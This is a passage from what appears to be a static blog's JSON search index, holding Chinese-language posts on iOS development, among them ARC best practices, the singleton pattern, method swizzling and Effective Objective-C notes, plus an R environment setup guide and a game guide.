新闻奖、2010年获得德国之声最佳中文博客奖之后，因为众所周知的原因无法在中国访问。现在，它以另一种姿态存在。「可能吧」更新频率不高，文章一般不怎么客观，请谨慎关注。\nPingWest中文网微信号：wepingwest\n功能介绍：有品好玩的科技,一切与你有关。科技博客PingWest中文网(pingwest.com)\n商业价值微信号：bvmagazine\n功能介绍：中国最好的技术商业杂志,关注更创新,更智慧,更可持续的商业,专为变革者打造.\n深圳湾微信号：shenzhenware\n功能介绍：深圳湾(ShenzhenWare)关注软件、硬件、以及软硬结合的生态系统.\n100offer说微信号：shuo100offer\n功能介绍：有关互联网人才流动和发展,我们触摸得到真实客观的跳槽数据,我们感受得到有血有肉的故事.我们在观察,我们也在思考,我们在这里「说」\n36氪微信号：wow36kr\n功能介绍：36氪(36kr.com)是中国最具影响力的互联网创投媒体,提供最新锐最具深度的商业报道.我们强调趋势与价值,我们的slogan是:让一部分人先看到未来.\n\n\n\n","tags":["公众号","微信"]},{"title":"单例类","url":"/2016/09/24/Singteton-Class/","content":"介绍单例模式（Singleton Pattern）最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。\n这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。\n注意：\n1、单例类只能有一个实例。\n2、单例类必须自己创建自己的唯一实例。\n3、单例类必须给所有其他对象提供这一实例。\n\n\n实现我们将创建一个 SingleObject 类。SingleObject 类有它的私有构造函数和本身的一个静态实例。SingleObject 类提供了一个静态方法，供外界获取它的静态实例。SingletonPatternDemo，我们的演示类使用 SingleObject 类来获取 SingleObject 对象。\n\n\n\n","categories":["iOS"],"tags":["Singteton"]},{"title":"iOS 持续集成","url":"/2016/09/26/Continuous-Integration/","content":"持续集成主要有两大好处：一是省去手动构建部署的繁琐，二是每一个提交都有自动跑测试保证质量。\n本文主要介绍两大持续集成工具：TravisCI 和 Jenkins。\nTravisCITravis CI 可以和 Github 无缝集成，每次push都可以触发相应的操作，跑测试、自动部署都能完成。\n","categories":["iOS"],"tags":["TravisCI","Jenkins"]},{"title":"越狱检测","url":"/2016/10/12/Check-Jailbroken/","content":"代码详情查看以下\n\n\n\n\n\n","categories":["iOS"],"tags":["Jailbreak"]},{"title":"地下城堡2：黑暗觉醒","url":"/2016/10/24/dungeon2/","content":"地下城堡2：黑暗觉醒转职一览表\n","categories":["游戏指南"],"tags":["地下城堡2"]},{"title":"【译】ARC 最佳实践","url":"/2016/11/04/ARC-Best-Practices/","content":"英文原文出处：http://amattn.com/p/arc_best_practices.html\n一些可选背景故事：\n相关文档：迁移至ARC版本说明\nMike Ash 在他的 Friday Q&amp;As 也有一篇关于ARC的文章。\n深入的技术文档在 LLVM 项目的 CLANG 网站上。\n\n假设你正在使用 iOS 5 或者更高版本，而不是 4。实际上，弱指针是 ARC 中的一个重要工具，所以我不建议在 iOS 4 中使用 ARC。\n更新注意事项这份文件自从2011年发布以来，一直在不断更新。最后一次微小的修订是在 2013年发布 iOS 7。\n\n\n一般情况\n纯量类型属性应该使用 assign。\n  @property (nonatomic, assign) int scalarInt;@property (nonatomic, assign) CGFloat scalarFloat;@property (nonatomic, assign) CGPoint scalarStruct;\n需要保留或者引用向下对象层次结构的对象属性应该使用 strong。\n  @property (nonatomic, strong) id childObject;\n\n引用向上对象层次结构的对象属性应该使用 weak。此外，当引用委托对象时，weak 是最安全的。\n  @property (nonatomic, weak) id parentObject;@property (nonatomic, weak) NSObject &lt;SomeDelegate&gt; *delegate;\n\nBlocks 仍然应该使用 copy。\n  @property (nonatomic, copy) SomeBlockType someBlock;\n\n在 dealloc 中：\n\n移除观察者\n注销通知\n设置所有不是 weak 的委托为 nil\n使所有定时器失效（译注：如果定时器是strong的属性，dealloc可能永远都不会被调用，所以定时器失效应该在ViewWillDisappear中完成）\n\n\nIBOutlets 应该是 weak，除了顶层 IBOutlets是 strong。（译注：使用storyboard（xib不行）创建的vc，会有一个叫_topLevelObjectsToKeepAliveFromStoryboard的私有数组强引用所有top level的对象，所以这时即便outlet声明成weak也没关系）\n\n\n桥接官方文档：\nid my_id;CFStringRef my_cfref;NSString   *a = (__bridge NSString*)my_cfref;     // Noop cast.CFStringRef b = (__bridge CFStringRef)my_id;      // Noop cast.NSString   *c = (__bridge_transfer NSString*)my_cfref; // -1 on the CFRefCFStringRef d = (__bridge_retained CFStringRef)my_id;  // returned CFRef +1\n\n详细解释：\n\n__bridge 对于内存管理是无操作的\n__bridge_transfer 用于转换 CFRef 为 Objective-C 对象。ARC 将减少 CFRef 的retain count，因此请确保 CFRef 具有+1 retain count。\n__bridge_retained 用于转换 Objective-C 对象为 CFRef。这将有效地给你返回一个 retain count +1的CFRef。 您有责任在未来某个时候调用 CFRef 的 CFRelease。\n\nNSError无处不在的 NSError 是有点棘手。典型的 Cocoa 约定是它们通过输出参数（也称为间接指针）实现。\n在ARC中，输出参数默认是 __autoreleasing，应该这样实现:\n- (BOOL)performWithError:(__autoreleasing NSError **)error&#123;    // ... some error occurs ...    if (error)    &#123;        // write to the out-parameter, ARC will autorelease it        *error = [[NSError alloc] initWithDomain:@&quot;&quot;                                             code:-1                                         userInfo:nil];        return NO;    &#125;    else    &#123;        return YES;    &#125;&#125;\n\n当使用输出参数时，你应该在 *error 对象使用 __autoreleasing。\nNSError __autoreleasing *error = error;BOOL OK = [myObject performOperationWithError:&amp;error];if (!OK)&#123;    // handle the error.&#125;\n\n如果你忘记 __autoreleasing，编译器将会简单地为你插入一个临时的中间自动释放对象。 这是在向后兼容性的压迫性制度下作出的妥协。我看到一些编译器配置不会自动使它们**__autoreleasing**。 对所有新代码包含 __autoreleasing 更安全的。\n@autoreleasepool使用 @autoreleasepool 内部循环：\n\n迭代很多，很多次\n创建大量的临时对象\n\n// If someArray is hugefor (id obj in someArray)&#123;    @autoreleasepool    &#123;        // or you are creating lots         // of temporary objects here...    &#125;&#125;\n\n使用 @autoreleasepool 指令创建和销毁自动释放池比蓝灯特价(译注：blue light special是沃尔玛的一个购物区域)还便宜。不要担心在循环中这样做。如果你超偏执，至少先检查profiler。\nBlocks一般来说，blocks 都能使用。但是有一些例外。\n当将 block 指针添加到集合时，你首先得复制它们。\nsomeBlockType someBlock = ^&#123;NSLog(@&quot;hi&quot;);&#125;;[someArray addObject:[someBlock copy]];\n\nblocks 的循环引用有些危险。你可能看到过这个警告：\nwarning: capturing &#x27;self&#x27; strongly in this block is likely to lead to a retain cycle [-Warc-retain-cycles,4]SomeBlockType someBlock = ^&#123;    [self someMethod];&#125;;\n\n原因是 someBlock 被 self 强引用，并且当 block 拷贝到堆中时将捕获并且 retain  self。\n使用任何实例变量也将捕获父对象，同样有不太明显的潜在循环引用：\n// The following block will retain &quot;self&quot;SomeBlockType someBlock = ^&#123;    BOOL isDone = _isDone;  // _isDone is an ivar of self&#125;;\n\n更安全，但令人愉快的解决办法是使用 weakSelf：\n__weak SomeObjectClass *weakSelf = self;SomeBlockType someBlock = ^&#123;    SomeObjectClass *strongSelf = weakSelf;    if (strongSelf == nil)    &#123;        // The original self doesn&#x27;t exist anymore.        // Ignore, notify or otherwise handle this case.    &#125;    else    &#123;        [strongSelf someMethod];    &#125;&#125;;\n\n有时，你需要注意避免使用任意对象的循环引用：如果 someObject 强引用 someObject 的 block，你需要使用 weakSomeObject 打破循环引用。\nSomeObjectClass *someObject = ...__weak SomeObjectClass *weakSomeObject = someObject;someObject.completionHandler = ^&#123;    SomeObjectClass *strongSomeObject = weakSomeObject;    if (strongSomeObject == nil)    &#123;        // The original someObject doesn&#x27;t exist anymore.        // Ignore, notify or otherwise handle this case.    &#125;    else    &#123;        // okay, NOW we can do something with someObject        [strongSomeObject someMethod];    &#125;&#125;;\n\n从NS对象或者UI对象访问CGRefUIColor *redColor = [UIColor redColor]; CGColorRef redRef = redColor.CGColor;// do some stuff with redRef.\n\n上面的例子有一些非常微妙的问题。当你创建 redRef，如果 redColor 不再使用，那么redColor 就在注释代码之后被销毁。\n问题是 redColor 持有 redRef，并且当访问 redRef，它可能或者可能不再是 colorRef。更糟的是，这种类型的错误很少出现在模拟器上。当在较低工作内存的设备（比如：早期的iPad）上使用时，更有可能发生。\n有几个解决办法。基本上都是当你在使用 redRef 时，保证 redColor 不会被释放。\n一种非常简单的实现就是使用 __autoreleasing。\nUIColor * __autoreleasing redColor = [UIColor redColor];CGColorRef redRef = redColor.CGColor;\n\n现在，redColor 不会被销毁，直到方法返回后某个不确定的时间，都能很好地使用。 我们可以安全地在方法的作用域使用 redRef。\n另一个方法是 retain redRef：\nUIColor *redColor = [UIColor redColor];CGColorRef redRef = CFRetain(redColor.CGColor);// use redRef and when done release it:CFRelease(redRef);\n\n重要提示：你需要 在使用redColor.CGColor 的同一行使用 CFRetain()。redColor 在上次使用之后有效地被破坏。以下方式不会有用：\nUIColor *redColor = [UIColor redColor];CGColorRef redRef = redColor.CGColor; // redColor is released right after this...CFRetain(redRef);  // This may crash......\n\n上面标有“This may crash”一行是一个有趣的注释。再次，我的经验里在模拟器上它不会经常崩溃，但在实际的iOS设备上100%崩溃。开发者请注意。\nThe Big Nerd Ranch 对这个问题有非常深入的探讨: http://weblog.bignerdranch.com/?p=296\nSingletons仅仅偶然地与ARC有关。本地生成的单例实现是一种激增。（许多不必要的重写 retain 和 release）\n这些都应该被替换为以下代码：\n+ (MyClass *)singleton&#123;    static MyClass *sharedMyClass = nil;    static dispatch_once_t once = 0;    dispatch_once(&amp;once, ^&#123;sharedMyClass = [[self alloc] init];&#125;);    return sharedMyClass;&#125;\n\n每一次你需要销毁单例的能力。如果你使用这个除了 UnitTests，你可能不再使用单例。\n// declare the static variable outside of the singleton methodstatic MyClass *__sharedMyClass = nil;+ (MyClass *)singleton&#123;    static dispatch_once_t once = 0;    dispatch_once(&amp;once, ^&#123;__sharedMyClass = [[self alloc] init];&#125;);    return __sharedMyClass;&#125;// For use by test frameworks only!- (void)destroyAndRecreateSingleton&#123;    __sharedMyClass = [[self alloc] init];&#125;\n\n译者后记第一次翻译，请大家多多指教。\n","categories":["iOS"],"tags":["ARC","译文"]},{"title":"Objective-C Method Swizzle","url":"/2016/10/26/Objective-C-Method-Swizzle/","content":"Method Swizzle（方法调配、方法混合、方法调和、方法混写） 是 Objective-C 运行时的黑魔法之一。我们可以通过 Swizzle 的手段，在运行时对某些方法的实现进行替换，这是 Objective-C 甚至说 Cocoa 开发中最为华丽，同时也是最为危险的技巧之一。Swizzle 使用了 Objective-C 的动态派发，对于 NSObject 的子类是可以直接使用的。\n通过此方案，可以为那些『完全不知道其具体实现的』黑盒方法增加日志记录功能，这非常有助于程序调试。然而，次做法只在调试程序时有用。很少有人在调试程序之外的场合用上述『Method Swillze』来永久改动某个类的功能。不能仅仅因为Objective-C 语言里有这个特性就一定要用它。若是滥用，反而会令代码变得不易读懂且难于维护。\n\n\n代码实现\n\n示例demodemo 中实现了通过 Swizzle 的方式统计应用内所有按钮的点击次数。\n代码下载地址：https://github.com/xwal/Demo/tree/master/SwizzleDemo\n","categories":["iOS"],"tags":["Objective-C","Runtime"]},{"title":"使用 R 进行数据分析","url":"/2016/11/07/Data-Analysis-With-R/","content":"macOS 上搭建 R 开发环境R 语言官方网站：https://www.r-project.org\nRStudio 官方网站：https://www.rstudio.com\nRStudio 是 R 语言的IDE。\n安装包安装\n安装 XQuartz\n下载地址：https://www.xquartz.org\n\n安装 R\n下载地址：https://cran.r-project.org\n\n安装 RStudio\n下载地址：https://www.rstudio.com/products/rstudio/download/\n\n\n命令行安装\n安装 Homebrew\n/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;brew tap caskroom/caskbrew install brew-caskbrew update &amp;&amp; brew upgrade brew-cask &amp;&amp; brew cleanup &amp;&amp; brew cask cleanup\n\n安装 R 开发工具\nbrew cask install xquartzbrew tap homebrew/sciencebrew install Rbrew cask install rstudio\n\n​\n\n\n","categories":["数据分析"],"tags":["R"]},{"title":"Effective Objective-C 2.0 要点","url":"/2016/11/11/Effective-Objective-C-2-0/","content":"第1章 熟悉 Objective-C第1条 了解 Objective-C 语言的起源\nObjective-C 为C语言添加了面向对象特性，是其超集。Objective-C 使用动态绑定的消息结构，也就是说，在运行时才会检查对象类型。接收一条消息之后，究竟应执行何种代码，由运行期环境而非编译器来决定。\n理解C语言的核心概念有助于写好Objective-C程序。尤其要掌握内存模型与指针。\n\n第2条 在类的头文件中尽量少引入其他头文件\n除非确有必要，否则不要引入头文件。一般来说，应在某个类的头文件中使用向前声明来提及别的类，并在实现文件中引入那些类的头文件。这样做可以尽量降低类之间的耦合。\n有时无法使用向前声明，比如要声明某个类遵循一项协议。这种情况下，尽量把『该类遵循某协议』的这条声明移至『class-continuation分类』中。如果不行的话，就把协议单独放在一个头文件中，然后将其引入。\n\n第3条 多用字面量语法，少用与之等价的方法\n应该使用字面量语法来创建字符串、数值、数组、字典。与创建此类对象的常规方法相比，这么做更加简明扼要。\n应该通过取下标操作来访问数组下标或字典中的键所对应的元素。\n用字面量语法创建数组或字典时，若值中有nil，则会抛出异常。因此，务必确保值里不含nil。\n\n第4条 多用类型常量，少用 #define 预处理指令\n不要用预处理指令定义常量。这样定义出来的常量不含类型信息，编译器只是会在编译前据此执行查找与替换操作。即使有人重新定义了常量值，编译器也不会产生警告信息，这将导致应用程序中的常量值不一致。\n在实现文件中使用 static const 来定义『只在编译单元内可见的常量』（translation-unit-specific constant）。由于此类常量不在全局符号表中，所以无须为其名称加前缀。\n在头文件中使用 extern 来声明全局常量，并在相关实现文件中定义其值。这种常量要出现在全局符号表中，所有其名称应加以区隔，通常用与之相关的类名做前缀。\n\n第5条 用枚举表示状态、选项、状态码\n应该用枚举来表示状态机的状态、传递给方法的选项以及状态码等值，给这些值起个易懂的名字。\n如果把传递给某个方法的选项表示为枚举类型，而多个选项又可同时使用，那么就将各选项值定义为2的幂，以便通过按位或操作将其组合起来。\n用 NS_ENUM 与 NS_OPTIONS 宏来定义枚举类型，并指明其底层数据类型。这样做可以确保枚举是用开发者所选的底层数据类型实现出来的，而不会采用编译器所选的类型。\n在处理枚举类型的 switch 语句中不要实现 default 分支。这样的话，加入新枚举之后，编译器就会提示开发者：switch 语句并未处理所有枚举。\n\n\n\n第2章 对象、消息、运行期第6条 理解『属性』这一概念\n可以用 @property 语法来定义对象中所封装的数据。\n通过『特质』来指定存储数据所需的正确语义。\n在设置所对应的实例变量时，一定要遵从该属性所声明的语义。\n开发 iOS 程序时应该使用 nonatomic 属性，因为 atomic 属性会严重影响性能。\n\n第7条 在对象内部尽量直接访问实例变量\n在对象内部读取数据时，应该直接通过实例变量来读，而写入数据时，则应通过属性来写。\n在初始化方法及dealloc方法中，总是应该直接通过实例变量来读写数据。\n有时会使用惰性初始化技术配置某份数据，这种情况下，需要通过属性来读取数据。\n\n第8条 理解『对象等同性』这一概念\n若想检测对象的等同性，请提供『isEqual:』与 hash 方法。\n相同的对象必须具有相同的哈希码，但是两个哈希码相同的对象却未必相同。\n不要盲目地逐个检测每条属性，而是应该依照具体需求来指定检测方案。\n编写 hash 方法时，应该使用计算速度快而且哈希码碰撞几率低的算法。\n\n第9条 以『类族模式』隐藏实现细节\n类族模式可以把实现细节隐藏在一套简单的公共接口后面。\n系统框架中经常使用类族。\n从类族的公共抽象基类中继承子类时要当心，若有开发文档，则应首先阅读。\n\n第10条 在既有类中使用关联对象存放自定义数据\n可以通过『关联对象』机制来把两个对象连起来。\n定义关联对象时可指定内存管理语义，用以模仿定义属性时所采用的『拥有关系』与『非拥有关系』。\n只有在其他做法不可行时才应选用关联对象，因为这种做法通常会引入难于查找的 bug。\n\n第11条 理解 objc_msgSend 的作用\n消息由接收者、选择子及参数构成。给某对象『发送消息』（invoke a message）也就相当于在该对象上『调用方法』（call a method）。\n发给某对象的全部消息都要由『动态消息派发系统』（dynamic message dispatch system）来处理，该系统会查出对应的方法，并执行其代码。\n\n第12条 理解消息转发机制\n若对象无法响应某个选择子，则进入消息转发流程。\n通过运行期的动态方法解析功能，我们可以在需要用到某个方法时再将其加入类中。\n对象可以把其无法解读的某些选择子交给其他对象来处理。\n经过上述两步之后，如果还是没办法处理选择子，那就启动完整的消息转发机制。\n\n第13条 用『方法调配技术』调试『黑盒方法』\n使用另一份实现来替换原来的方法实现，这道工序叫做『方法调配』，开发者常用此技术向原有实现中添加新功能。\n一般来说，只有调试程序的时候才需要在运行期修改方法实现，这种做法不宜滥用。\n\n第14条 理解『类对象』的用意\n每个实例都有一个指向 Class 对象的指针，用以表明其类型，而这些 Class 对象则构成了类的继承体系。\n如果对象类型无法在编译器确定，那么久应该使用类型信息查询方法来探知。\n尽量使用类型信息查询方法来确定对象类型，而不要直接比较类对象，因为某些对象可能实现了消息转发功能。\n\n第3章 接口与 API 设计第15条 用前缀避免命名空间冲突\n选择与你的公司、应用程序或二者皆有关联之名称作为类名的前缀，并在所有代码中均使用这一前缀。\n若自己所开发的程序库中用到了第三方库，则应为其中的名称加上前缀。\n\n第16条 提供『全能初始化方法』\n在类中提供一个全能初始化方法，并在文档里指明。其他初始化方法均应调用此方法。\n若全能初始化方法与超类不同，则需覆写超类中的对应方法。\n如果超类的初始化方法不适用于子类，那么应该覆写这个超类方法，并在其中抛出异常。\n\n第17条 实现 description 方法\n实现 description 方法返回一个有意义的字符串，用以描述该实例。\n若想在调试时打印出更详尽的对象描述信息，则应实现 debugDescription 方法。\n\n第18条 尽量使用不可变对象\n尽量创建不可变的对象。\n若某属性仅可于对象内部修改，则在『class-continuation 分类』中将其由 readonly 属性扩展为 readwrite 属性。\n不要把可变的 collection 作为属性公开，而应提供相关方法，以此修改对象中的可变 collection。\n\n第19条 使用清晰而协调的命名方式\n起名时应遵从标准的 Objective-C 命名规范，这样创建出来的接口更容易为开发者所理解。\n方法名要言简意赅，从左至右读起来要像个日常用语中的句子才好。\n方法名里不要使用缩略后的类型名称。\n给方法起名时的第一要务就是确保其风格与你自己的代码或所要集成的框架相符。\n\n第20条 为私有方法名加前缀\n给私有方法的名称加上前缀，这样可以很容易地将其同公共方法区分开。\n不要单用一个下划线做私有方法的前缀，因为这种做法是预留给苹果公司用的。\n\n第21条 理解 Objective-C 错误模型\n只要发生了可使整个应用程序崩溃的严重错误时，才应使用异常。\n在错误不那么严重的情况下，可以指派『委托方法』（delegate method）来处理错误，也可以把错误信息放在 NSError 对象里，经由『输出参数』返回给调用者。\n\n第22条 理解 NSCopying 协议\n若想令自己所写的对象具有拷贝功能，则需实现 NSCopying 协议。\n如果自定义的对象分为可变版本与不可变版本，那么就要同时实现 NSCopying 与 NSMutableCopying 协议。\n复制对象时需决定采用浅拷贝还是深拷贝，一般情况下应该尽量执行浅拷贝。\n如果你所写的对象需要深拷贝，那么可考虑新增一个专门执行深拷贝的方法。\n\n第4章 协议与分类第23条 通过委托与数据源协议进行对象间通信\n委托模式为对象提供了一套接口，使其可由此将相关事件告知其他对象。\n将委托对象应该支持的接口定义成协议，在协议中把可能需要处理的事件定义成方法。\n当某对象需要从另一个对象中获取数据时，可以使用委托模式。这种情况下，该模式亦称『数据源协议』（data source protocal）。\n若有必要，可实现含有位段的结构体，将委托对象是否能响应相关协议方法这一信息缓存至其中。\n\n第24条 将类的实现代码分散到便于管理的数个分类之中\n使用分类机制把类的实现代码划分成易于管理的小块。\n将应该视为『私有』的方法归入名叫Private的分类中，以隐藏实现细节。\n\n第25条 总是为第三方类的分类名称加前缀\n向第三方类中添加分类时，总应给其名称加上你专用的前缀。\n向第三方类中添加分类时，总应给其中的方法名加上你专用的前缀。\n\n第26条 勿在分类中声明属性\n把封装数据所用的全部属性都定义在主接口里。\n在『class-continuation分类』之外的其他分类中，可以定义存取方法，但尽量不要定义属性。\n\n第27条 使用『class-continuation分类』隐藏实现细节\n通过『class-continuation分类』向类中新增实例变量。\n如果某属性在主接口中声明为『只读』，而类的内部又要用设置方法修改此属性，那么就在『class-continuation分类』中将其扩展为『可读写』。\n把私有方法的原型声明在『class-continuation分类』里面。\n若想使类所遵循的协议不为人所知，则可于『class-continuation分类』中声明。\n\n第28条 通过协议提供匿名对象\n协议可在某种程度上提供匿名类型，具体的对象类型可以淡化成遵从某协议的 id 类型，协议里规定了对象所应实现的方法。\n使用匿名对象来隐藏类型名称（或类名）。\n使用具体类型不重要，重要的是对象能够响应（定义在协议里的）特定方法，那么可使用匿名对象来表示。\n\n第5章 内存管理第29条 理解引用计数\n引用计数机制通过可以递增递减的计数器来管理内存。对象创建好之后，其保留计数至少为1。若保留计数为正，则对象继续存活。当保留计数降为0时，对象就被销毁了。\n在对象生命期中，其余对象通过引用来保留或释放此对象。保留与释放操作分别会递增及递减保留计数。\n\n第30条 以 ARC 简化引用计数\n有 ARC 之后，程序员就无须担心内存管理问题了。使用 ARC 来编程，可省去类中的许多『样板代码』。\nARC 管理对象生命期的办法基本上就是：在合适的地方插入『保留』及『释放』操作。在 ARC 环境下，变量的内存管理语义可以通过修饰符指明，而原来则需要手工执行『保留』及『释放』操作。\n由方法返回的对象，其内存管理语义总是通过方法名来体现。 ARC 将此确定为开发者必须遵守的规则。\nARC 只负责管理 Objective-C 对象的内存。尤其要注意：CoreFoundation 对象不归ARC 管理，开发者必须适时调用 CFRetain&#x2F;CFRelease。\n\n第31条 在 dealloc 方法中只释放引用并解除监听\n在 dealloc 方法里，应该做的事情就是释放指向其他对象的引用，并取消原来订阅的『键值观测』（KVO）或 NSNotificationCenter 等通知，不要做其他事情。\n如果对象持有文件描述符等系统资源，那么应该专门编写一个方法来释放此种资源。这样的类要和其使用者约定：用完资源后必须调用 close 方法。\n执行异步任务的方法不应在 dealloc 里调用；只能在正常状态下执行的那些方法也不应在dealloc里调用，因为此时对象已处于正在回收的状态了。\n\n第32条 编写『异常安全代码』时留意内存管理问题\n捕获异常时，一定要注意将 try 块内所创立的对象清理干净。\n在默认情况下，ARC 不生成安全处理异常所需的清理代码，开启编译器标志后，可生成这种代码，不过会导致应用程序变大，而且会降低运行效率。\n\n第33条 以弱引用避免保留环\n将某些引用设为 weak，可避免出现『保留环』。\nweak 引用可以自动清空，也可以不自动清空。自动清空（autonilling）是随着 ARC 而引入的新特性，由运行期系统来实现。在具备自动清空功能的弱引用上，可以随意读取其数据，因为这种引用不会指向已经回收过的对象。\n\n第34条 以『自动释放池块』降低内存峰值\n自动释放池排布在栈中，对象收到 autorelease 消息后，系统将其放入最顶端的池里。\n合理运用自动释放池，可降低应用程序的内存峰值。\n@autoreleasepool 这种新式写法能创建出更为轻便的自动释放池。\n\n第35条 用『僵尸对象』调试内存管理问题\n系统在回收对象时，可以不将其真的回收，而是把它转化为僵尸对象。通过环境变量 NSZombieEnabled 可开启此功能。\n系统会修改对象的 isa 指针，令其指向特殊的僵尸类，从而使该对象变成僵尸对象。僵尸类能够响应所有的选择子，响应方式为：打印一条包含消息内容及其接收者的消息，然后终止应用程序。\n\n第36条 不要使用 retainCount\n对象的保留计数看似有用，实则不然，因为任何给定时间点上的『绝对保留计数』（absolute retain count）都无法反映对象生命期的全貌。\n引入 ARC 之后，retainCount 方法就正式废止了，在 ARC 下调用该方法会导致编译器报错。\n\n第6章 块（block）与大中枢派发（GCD）第37条 理解『块』这一概念\n块是C、C++、Objective-C 中的词法闭包。\n块可接受参数，也可返回值。\n块可以分配在栈或堆上，也可以是全局的。分配在栈上的块可拷贝到堆里，这样的话，就和标准的 Objective-C 对象一样，具备引用计数了。\n\n第38条 为常用的块类型创建 typedef\n以 typedef 重新定义块类型，可令块变量用起来更加简单。\n定义新类型时应遵从现有的命名习惯，勿使其名称与别的类型相冲突。\n不妨为同一个块签名定义多个类型别名。如果要重构的代码使用了块类型的某个别名，那么只需修改相应 typedef 中的块签名即可，无须改动其他 typedef。\n\n第39条 用 handler 块降低代码分散程度\n在创建对象时，可以使用内联的 handler 块将相关业务逻辑一并声明。\n在有多个实例需要监控时，如果采用委托模式，那么经常需要根据传入的对象来切换，而若改用 handler 块来实现，则可直接将块与相关对象放在一起。\n设计 API 时如果用到了 handler 块，那么可以增加一个参数，使调用者可通过此参数来决定应该把块安排在哪个队列上执行。\n\n第40条 用块引用其所属对象时不要出现保留环\n如果块所捕获的对象直接或间接地保留了块本身，那么就得当心保留环问题。\n一定要找个适当的时机解除保留环，而不能把责任推给API的调用者。\n\n第41条 多用派发队列，少用同步锁\n派发队列可用来表述同步语义（synchronization semantic），这种做法要比使用 @synchronized 块或 NSLock 对象更简单。\n将同步与异步派发结合起来，可以实现与普通加锁机制一样的同步行为，而这么做却不会阻塞执行异步派发的线程。\n使用同步队列及栅栏块，可以令同步行为更加高效。\n\n第42条 多用 GCD，少用 performSelector 系列方法\nperformSelector 系列方法在内存管理方面容易有疏失。它无法确定将要执行的选择子具体是什么，因而 ARC 编译器也就无法插入适当的内存管理方法。\nperformSelector 系列方法所能处理的选择子太过局限了，选择子的返回值类型及发送给方法的参数个数都受到限制。\n如果想把任务放在另一个线程上执行，那么最好不要用 performSelector 系列方法，而是应该把任务封装到块里，然后调用大中枢派发机制的相关方法来实现。\n\n第43条 掌握 GCD 及操作队列的使用时机\n在解决多线程与任务管理问题时，派发队列并非唯一方案。\n操作队列提供了一套高层的 Objective-C API，能实现纯 GCD 所具备的绝大部分功能，而且还能完成一些更为复杂的操作，那些操作若改用 GCD 来实现，则需另外编写代码。\n\n第44条 通过 Dispatch Group 机制，根据系统资源状况来执行任务\n一系列任务可归入一个 dispatch group 之中。开发者可以在这组任务执行完毕时获得通知。\n通过 dispatch group，可以在并发式派发队列里同时执行多项任务。此时 GCD 会根据系统资源状况来调度这些并发执行的任务。开发者若自己来实现此功能，则需编写大量代码。\n\n第45条 使用 dispatch_once 来执行只需运行一次的线程安全代码\n经常需要编写『只需执行一次的线程安全代码』（thread-safe single-code execution）。通过 GCD 所提供的 dispatch_once 函数，很容易就能实现此功能。\n标记应该声明在 static 或 global 作用域中，这样的话，在把只需执行一次的块传给 dispatch_once 函数时，传进去的标记也是相同的。\n\n第46条 不要使用 dispatch_get_current_queue\ndispatch_get_current_queue 函数的行为常常与开发者所预期的不同。此函数已经废弃，只应做调试之用。\n由于派发队列是按层级来组织的，所以无法单用某个队列对象来描述『当前队列』这一概念。\ndispatch_get_current_queue 函数用于解决由不可重入的代码所引发的死锁，然而能用此函数解决的问题，通常也能改用『队列特定数据』来解决。\n\n第7章 系统框架第47条 熟悉系统框架\n许多系统框架都可以直接使用。其中最重要的是 Foundation 和 CoreFoundation，这两个框架提供了构建应用程序所需的许多核心功能。\n很多常见任务都能用框架来做，例如音频与视频处理、网络通信、数据管理等。\n请记住：用纯 C 写成的框架与用 Objective-C 写成的一样重要，若想成为优秀的 Objective-C 开发者，应该掌握 C 语言的核心概念。\n\n第48条 多用块枚举，少用 for 循环\n遍历 collection 有四种方式。最基本的办法是 for 循环，其次是 NSEnumerator 遍历法及快速遍历法，最新、最先进的方式则是『块枚举法』。\n『块枚举法』本身就能通过 GCD 来并发执行遍历操作，无须另行编写代码。而采用其他遍历方式则无法轻易实现这一点。\n若提前知道待遍历的 collection 含有何种对象，则应修改块签名，指出对象的具体类型。\n\n第49条 对自定义其内存管理语义的 collection 使用无缝桥接\n通过无缝桥接技术，可以在 Foundation 框架中的 Objective-C 对象与 CoreFoundation 框架中的 C 语言数据结构之间来回转换。\n在 CoreFoundation 层面创建 collection 时，可以指定许多回调函数，这些函数表示此 collection 应如何处理其元素。然后，可运用无缝桥接技术，将其转换成具备特殊内存管理语义的 Objective-C collection。\n\n第50条 构建缓存时选用 NSCache 而非 NSDictionary\n实现缓存时应选用 NSCache 而非 NSDictionary 对象。因为 NSCache 可以提供优雅的自动删减功能，而且是『线程安全的』。此外，它与字典不同，并不会拷贝键。\n可以给 NSCache 对象设置上限，用以限制缓存中的对象总个数及『总成本』。而这些尺度则定义了缓存删减其中对象的时机。但是绝对不要把这些尺度当成可靠的『硬限制』（hard limit），它们仅对 NSCache 起指导作用。\n将 NSPurgeableData 与 NSCache 搭配使用，可实现自动清除数据的功能，也就是说，当 NSPurgeableData 对象所占内存为系统所丢弃时，该对象自身也会从缓存中移除。\n如果缓存使用的得当，那么应用程序的响应速度就能提高。只有那种『重新计算起来很费事的』数据，才值得放入缓存，比如那些需要从网络获取或从磁盘读取的数据。\n\n第51条 精简 initialize 与 load 的实现代码\n在加载阶段，如果类实现了 load 方法，那么系统就会调用它。分类里也可以定义此方法，类的 load 方法要比分类中的先调用。与其他方法不同，load 方法不参与覆写机制。\n首次使用某个类之前，系统会向其发送 initialize 消息。由于此方法遵从普通的覆写规则，所以通常应该在里面判断当前要初始化的是那个类。\nload 与 initialize 方法都应该实现得精简一些，这有助于保持应用程序的响应能力，也能减少引入『依赖环』（interdependency cycle）的几率。\n无法在编译器设定的全局变量，可以放在 initialize 方法里初始化。\n\n第52条 别忘了 NSTimer 会保留其目标对象\nNSTimer 对象会保留其目标，直到计时器本身失效为止，调用 invalidate 方法可令计时器失效，另外，一次性的计时器在触发完任务之后也会失效。\n反复执行任务的计时器（repeating timer），很容易引入保留环，如果这种计时器的目标对象又保留了计时器本身，那肯定会导致保留环。这种环状保留关系，可能是直接发生的，也可能是通过对象图里的其他对象间接发生的。\n可以扩充 NSTimer 的功能，用『块』来打破保留环。不过，除非 NSTimer 将来在公共接口里提供此功能，否则必须创建分类，将相关实现代码加入其中。\n\n","categories":["iOS"],"tags":["Objective-C"]},{"title":"iOS 依赖库管理工具","url":"/2016/11/13/Cocoa-Dependency-Manager/","content":"CocoaPodsCocoaPods 